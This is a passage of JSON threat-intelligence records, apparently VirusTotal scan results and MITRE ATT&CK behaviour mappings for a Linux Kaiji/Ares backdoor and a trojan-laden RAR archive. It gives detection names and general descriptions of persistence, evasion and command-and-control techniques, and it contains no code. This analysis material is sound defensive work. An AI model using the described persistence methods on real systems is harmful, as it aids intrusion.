          "engine_update": "20230626"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230607"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Backdoor.Ares!1.E39E (CLASSIC)",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.1.14.0",
          "result": "Trojan.Linux.Kaiji",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "MaxSecure": {
          "category": "undetected",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230624"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "6.4.258.0",
          "result": "ELF/Kaiji.J!tr",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "22.11.7701.0",
          "result": "ELF:Ares-C [Bot]",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20210330"
        },
        "Panda": {
          "category": "malicious",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": "ELF/TrojanGen.A",
          "method": "blacklist",
          "engine_update": "20230626"
        }
      }
    },
    "type": "file",
    "id": "447431333b2c2a72ac213a9fa2da8c2b09383ae75c3b31a88acfa79b8d43b8d8",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/447431333b2c2a72ac213a9fa2da8c2b09383ae75c3b31a88acfa79b8d43b8d8"
    }
  },
  "mitre": {
    "data": {
      "Zenbox Linux": {
        "tactics": [
          {
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "description": "Adversaries may abuse the at utility to perform task scheduling for initial, recurring, or future execution of malicious code. The at command within Linux operating systems enables administrators to schedule tasks.\nAn adversary may use at in Linux environments to execute programs at system startup or on a scheduled basis for persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.\nAdversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via sudo.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample tries to persist itself using cron"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/001/",
                "id": "T1053.001",
                "name": "At (Linux)"
              },
              {
                "description": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources. Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  \nSystemd utilizes unit configuration files with the .service file extension to encode information about a service's process. By default, system level unit files are stored in the /systemd/system directory of the root owned directories (/). User level unit files are stored in the /systemd/user directories of the user owned directories ($HOME). \nInside the .service unit files, the following directives are used to execute commands:  \n\nExecStart, ExecStartPre, and ExecStartPost directives execute when a service is started manually by systemctl or on system start if the service is set to automatically start.\nExecReload directive executes when a service restarts. \nExecStop, ExecStopPre, and ExecStopPost directives execute when a service is stopped.  \n\nAdversaries have created new service files, altered the commands a .service file’s directive executes, and modified the user directive a .service file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"systemctl\" command used for controlling the systemd system and service manager"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1543/002/",
                "id": "T1543.002",
                "name": "Systemd Service"
              },
              {
                "description": "Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files. These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user opens a command-line interface or connects remotely. Since the system only executes the first existing file in the listed order, adversaries have used ~/.bash_profile to ensure execution. Adversaries have also leveraged the ~/.bashrc file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface. Some malware targets the termination of a program to trigger execution, adversaries can use the ~/.bash_logout file to execute malicious commands at the end of a session. \nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin. The login shell then configures the user environment with ~/.zprofile and ~/.zlogin. The interactive shell uses the ~/.zshrc to configure the user environment. Upon exiting, /etc/zlogout and ~/.zlogout are executed. For legacy programs, macOS executes /etc/bashrc on startup.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample tries to persist itself using /etc/profile"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1546/004/",
                "id": "T1546.004",
                "name": "Unix Shell Configuration Modification"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "id": "TA0003",
            "name": "Persistence"
          },
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may abuse the at utility to perform task scheduling for initial, recurring, or future execution of malicious code. The at command within Linux operating systems enables administrators to schedule tasks.\nAn adversary may use at in Linux environments to execute programs at system startup or on a scheduled basis for persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.\nAdversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via sudo.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample tries to persist itself using cron"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/001/",
                "id": "T1053.001",
                "name": "At (Linux)"
              },
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Writes shell script files to disk"
                  },
                  {
                    "severity": "INFO",
                    "description": "Executes commands using a shell command-line interpreter"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              },
              {
                "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"sed\" command used to modify input streams (typically from files or pipes)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1059/",
                "id": "T1059",
                "name": "Command and Scripting Interpreter"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment. For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the DescribeSecurityGroups action with various request parameters. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses the \"uname\" system call to query kernel version information (possible evasion)"
                  },
                  {
                    "severity": "INFO",
                    "description": "May try to detect the virtual machine to hinder analysis (VM artifact strings found in memory)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1518/001/",
                "id": "T1518.001",
                "name": "Security Software Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "techniques": [
              {
                "description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Enumerates processes within the \"proc\" file system"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1003/",
                "id": "T1003",
                "name": "OS Credential Dumping"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0006/",
            "id": "TA0006",
            "name": "Credential Access"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, Unix Shell Configuration Modification, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Sample tries to set the executable flag"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1222/",
                "id": "T1222",
                "name": "File and Directory Permissions Modification"
              },
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Writes shell script files to disk"
                  },
                  {
                    "severity": "INFO",
                    "description": "Executes commands using a shell command-line interpreter"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              },
              {
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading. Masquerading may also include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Drops files in suspicious directories"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1036/",
                "id": "T1036",
                "name": "Masquerading"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/",
                "id": "T1071",
                "name": "Application Layer Protocol"
              },
              {
                "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1095/",
                "id": "T1095",
                "name": "Non-Application Layer Protocol"
              },
              {
                "description": "Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Detected TCP or UDP traffic on non-standard ports"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1571/",
                "id": "T1571",
                "name": "Non-Standard Port"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may abuse the at utility to perform task scheduling for initial, recurring, or future execution of malicious code. The at command within Linux operating systems enables administrators to schedule tasks.\nAn adversary may use at in Linux environments to execute programs at system startup or on a scheduled basis for persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.\nAdversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via sudo.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample tries to persist itself using cron"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/001/",
                "id": "T1053.001",
                "name": "At (Linux)"
              },
              {
                "description": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources. Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  \nSystemd utilizes unit configuration files with the .service file extension to encode information about a service's process. By default, system level unit files are stored in the /systemd/system directory of the root owned directories (/). User level unit files are stored in the /systemd/user directories of the user owned directories ($HOME). \nInside the .service unit files, the following directives are used to execute commands:  \n\nExecStart, ExecStartPre, and ExecStartPost directives execute when a service is started manually by systemctl or on system start if the service is set to automatically start.\nExecReload directive executes when a service restarts. \nExecStop, ExecStopPre, and ExecStopPost directives execute when a service is stopped.  \n\nAdversaries have created new service files, altered the commands a .service file’s directive executes, and modified the user directive a .service file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"systemctl\" command used for controlling the systemd system and service manager"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1543/002/",
                "id": "T1543.002",
                "name": "Systemd Service"
              },
              {
                "description": "Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files. These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user opens a command-line interface or connects remotely. Since the system only executes the first existing file in the listed order, adversaries have used ~/.bash_profile to ensure execution. Adversaries have also leveraged the ~/.bashrc file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface. Some malware targets the termination of a program to trigger execution, adversaries can use the ~/.bash_logout file to execute malicious commands at the end of a session. \nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin. The login shell then configures the user environment with ~/.zprofile and ~/.zlogin. The interactive shell uses the ~/.zshrc to configure the user environment. Upon exiting, /etc/zlogout and ~/.zlogout are executed. For legacy programs, macOS executes /etc/bashrc on startup.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample tries to persist itself using /etc/profile"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1546/004/",
                "id": "T1546.004",
                "name": "Unix Shell Configuration Modification"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/447431333b2c2a72ac213a9fa2da8c2b09383ae75c3b31a88acfa79b8d43b8d8/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65b4f61d247565d4a4ddeefa"
  },
  "data": {
    "attributes": {
      "type_description": "RAR",
      "tlsh": "T16327333F7E71FB342A9991504C1D707B48F63782D5A2EE19A44F840A7B4E90ACF9E0B5",
      "type_tags": [
        "compressed",
        "rar"
      ],
      "names": [
        "20ab498b278b14f3786f634778a04d219c74e9fd8517b98f4aca313c9934b7f2.rar",
        "plan_dsns.gov.ua.rar"
      ],
      "last_modification_date": 1706264145,
      "type_tag": "rar",
      "times_submitted": 38,
      "total_votes": {
        "harmless": 0,
        "malicious": 3
      },
      "size": 20789108,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.bsymem/remoteutilities",
        "popular_threat_category": [
          {
            "count": 17,
            "value": "trojan"
          },
          {
            "count": 4,
            "value": "hacktool"
          },
          {
            "count": 2,
            "value": "dropper"
          }
        ],
        "popular_threat_name": [
          {
            "count": 6,
            "value": "bsymem"
          },
          {
            "count": 3,
            "value": "remoteutilities"
          },
          {
            "count": 2,
            "value": "apya"
          }
        ]
      },
      "last_submission_date": 1705936020,
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.ZIP.Bsymem.4!c",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "MicroWorld-eScan": {
          "category": "undetected",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "FireEye": {
          "category": "undetected",
          "engine_name": "FireEye",
          "engine_version": "35.47.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": "Trojan.Multi",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "Artemis!Trojan",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Malwarebytes": {
          "category": "malicious",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": "Trojan.Dropper",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.138.50858",
          "result": "Unwanted-Program ( 004bb7931 )",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "malicious",
          "engine_name": "K7GW",
          "engine_version": "12.138.50859",
          "result": "Unwanted-Program ( 004bb7931 )",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "CrowdStrike": {
          "category": "timeout",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": null
        },
        "Arcabit": {
          "category": "undetected",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "VirIT": {
          "category": "malicious",
          "engine_name": "VirIT",
          "engine_version": "9.5.626",
          "result": "Trojan.Win64.Agent.CHJE",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": "Trojan.Gen.NPE",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.125",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240115"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28633",
          "result": "Win32/RemoteUtilities.AA",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.493",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "Win64:Malware-gen",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "ClamAV": {
          "category": "malicious",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": "Win.Dropper.njRAT-9986242-0",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "Trojan.Win32.Bsymem.apya",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "BitDefender": {
          "category": "undetected",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": "Trojan.Win64.RMS.khqfql",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Win32.Trojan.Bsymem.Ctgl",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Cynet": {
          "category": "type-unsupported",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.29",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-26.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": "Mal/Generic-S",
          "method": "blacklist",
